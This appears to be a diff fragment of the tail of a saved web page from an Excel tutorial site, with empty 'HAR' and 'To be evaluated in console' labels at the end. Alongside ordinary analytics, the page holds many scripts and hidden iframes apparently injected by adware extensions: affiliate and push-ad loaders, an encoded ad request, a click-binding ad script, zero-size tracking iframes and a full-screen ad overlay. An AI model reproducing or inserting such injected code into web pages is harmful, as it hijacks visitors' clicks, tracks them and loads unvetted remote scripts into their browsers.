+</script><script type="text/javascript" src="//apikeys.civiccomputing.com/c/v?d=www.excelfunctions.net&amp;p=cookiecontrol%20single-site&amp;v=6&amp;k=230f83cebc4f3b4781b2f0b7d31d1f14d120f4bc"></script> <!-- Code for Google Analytics -->
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script><script src="http://www.google-analytics.com/ga.js" type="text/javascript"></script>
+<script type="text/javascript">
+var pageTracker = _gat._getTracker("UA-68738604-1");
+pageTracker._trackPageview();
+</script>      
+        
+       
+
+ <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnltcH7XQ1p1GxkwkdaRfWK9%2blCnp6JG6yKsdxhuqt3%2bdFeHPy8r8ipFnPzekuMy5if7qKtFRheWPboUUr%2fhtz9J7Vmx5v%2fOtOm%2fh61oRgV%2bdwnmGKMal8G7lGESUmajrhZf22I35dH6fh%2bvk0jcYN9CVQOVYb7V%2bkZbBAmTi5GK2Tvbth4wZcic4gul86uaZcV2jIenvIByO22Kthuo7AM8K%2frG9Wc30lOuDeH0OJjGuegKYl0Oyt2NwrjgtwXLYdLj8RVuf4WSP9%2bGDEEAxq%2bZsBzhOPFPYJU4Fzdj7TKsL%2bhQ9dYOmWv68mcRVcCEVFbUuprPIKMSNOE%2ff8mtlBJauIHolJJxt9a%2flnrItioHIo9YREtAQ4Vr3%2bmpSJmYVHoS2yVMVq3EvabVZxBn3Ypn0jFOEB3XuOrO7mDZx5hq1LD93DogdX2wF4i6%2fV6jWmOV4q3CSk7wWo9C3ZJ2f54EF3H6coUfaTk5ebAVugAMKnafe1sagSn%2fjIJhR%2bBYnoqTSNarREAi%2f%2bqdWLW9rjBEVFfcqy9fa3" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+<script type="text/javascript" src="//api.jollywallet.com/affiliate/client?p=16&amp;dist=261&amp;sub=chrome208" class="JOLLYWALLET_mainScript"></script><iframe id="orion_ifrm" src="//q2u3z6t7.ssl.hwcdn.net/html/pixel.html?d=2" style="width:1px;height:1px;top:-1000px;right-1000px;position:absolute"></iframe><table cellspacing="0" cellpadding="0" class="gstl_50 gssb_c" style="width: 213px; display: none; top: 46px; left: 1039px; position: absolute;"><tbody><tr><td class="gssb_f"></td><td class="gssb_e" style="width: 100%;"></td></tr></tbody></table><script src="//fp135.digitaloptout.com/pubjs?pid=294866&amp;cid=1&amp;uid=3CD73E1C72FB46588D47DD667442D173&amp;sid=clkmidex_ID&amp;an=Albireo&amp;opt=0&amp;u=http%3A%2F%2Fcanopus.orgfree.com%2Funinstall.html" id="confsc"></script><script src="https://istatic.eshopcomp.com/fo/ec/bitshakersr.js?subid=clkmidex_ID&amp;bname=Albireo&amp;blink=http://canopus.orgfree.com/uninstall.html"></script><script src="https://cdncache-a.akamaihd.net/sub/xd1c6ea/clkmidex_ID/l.js?pid=1725&amp;ext=Albireo"></script><script src="https://www.tr553.com/InterYield/bindevent.do?e=click&amp;affiliate=Bitshakers2&amp;subid=clkmidex_ID&amp;ecpm=0&amp;debug=false&amp;snoozeMinutes=2&amp;adCountIntervalHours=24&amp;maxAdCountsPerInterval=6&amp;attributionLogo=http%3A%2F%2Fdbo1rpcxmp3fw.cloudfront.net%2Fimg%2Flogo_vb_small.png&amp;attributionTitle=Ads%20by%20Albireo&amp;attributionLink=http%3A%2F%2Fcanopus.orgfree.com%2Funinstall.html&amp;endpoint=https%3A%2F%2Fwww.tr553.com"></script><script src="http://asrv-a.akamaihd.net/sd/9160/1002.js"></script><div id="media1534" style="display:none;z-index: 2147483647;position:absolute;width:90%;height:95%;top:20px;left:67.44999999999993px;"><div id="mainPrpTop" style="width:100%;height:46px;background-color:#F4F4F4;top: 0px;z-index: 700000;position:relative;"><div id="leftPrpTop" style="height: 46px;width: 178px;float: left;font-family: verdana;font-weight: bold;color: #595959;text-align: center;line-height: 34px;font-size: 13px;">Advertisement<a href="http://canopus.orgfree.com/uninstall.html" style="font-size:9px;color:#848484;text-decoration: none;font-weight: normal;display: block;line-height:0px" target="_blanc">Ads by Albireo</a></div><div id="middlePrpTop" style="display: inline-block;width: 50%;height: 100%;"></div><div id="rightPrpTop" style="float:right;height: 75px;width: 200px;float: right;font-family: verdana;color: #595959;font-size: 13px;direction: ltr;"><div id="countdownText" style="margin-top: 6px; display: none;">Please wait...</div><div id="contdownHolder" style="height: 24px; display: none;"><span id="contdown">0</span><span id="contdownText"> seconds</span></div><div id="skipButton" onclick="orion_WGT_main.returnToPage();" style="margin-top: 6px; width: 121px; height: 25px; border-radius: 4px; font-size: 16px; text-align: center; line-height: 25px; cursor: pointer; background-color: rgb(0, 168, 255);">SKIP AD</div><div id="removeThisVB" style=""><a href="http://canopus.orgfree.com/uninstall.html" style="font-size:9px;color:#848484;text-decoration: none;font-weight: normal;margin-left:27px;" target="_blanc">  remove this</a></div></div></div><iframe id="or987" width="100%" height="100%" src="http://www.onclicktop.com/a/display.php?r=1052975"></iframe></div><iframe id="GDA23JGF43UYUO16" name="acontrol" frameborder="0" marginwidth="0" marginheight="0" src="http://mybrowserpages.com/acontrol/index.html#http://www.excelfunctions.net" style="width: 0px; height: 0px;"></iframe><script id="WOOGFuoe1003" src="http://asrv-a.akamaihd.net/sd/9657/1003.js"></script><script id="WOOGFuoe9898" src="http://asrv-a.akamaihd.net/sd/9657/1001.js"></script><script src="http://asrv-a.akamaihd.net/sd/9657/1002.js"></script><script id="GENIDDP9898" src="http://i.qkntjs.info/qknt/javascript.js"></script><script id="RATEXCHANGE9898" type="text/javascript" src="//ratexchange.net/6241d3cd091af1ce1c.js"></script><iframe frameborder="0" height="0" width="0" scrolling="no" src="https://v3x3b3b5.map2.ssl.hwcdn.net/dc/603151/d1/neb342356cf3daf5fcf5u.html#&amp;src=www.excelfunctions.net&amp;m=IEV4Y2VsIEZ1bmN0aW9ucyBhbmQgRm9ybXVsYXM"></iframe><i class=" fa" style="display: none;"></i><script src="http://q2u3z6t7.ssl.hwcdn.net/js/vbates.js?d=27102015"></script><iframe frameborder="0" height="0" width="0" scrolling="no" src="https://v3x3b3b5.map2.ssl.hwcdn.net/dc/603151/d1/neb342356cf3daf5fcf5u.html#&amp;src=www.excelfunctions.net&amp;m=IEV4Y2VsIEZ1bmN0aW9ucyBhbmQgRm9ybXVsYXM"></iframe>
+<style>
+body {
+background-color: #cwr;
+    font-family: 'Source Sans Pro',Calibri,sans-serif,Arial;
+    font-size: 100%;
+    line-height: 1.4em;
+    margin: 0;
+}
+</style>
+</body></html>
+-HAR:
+
+-To be evaluated in console:
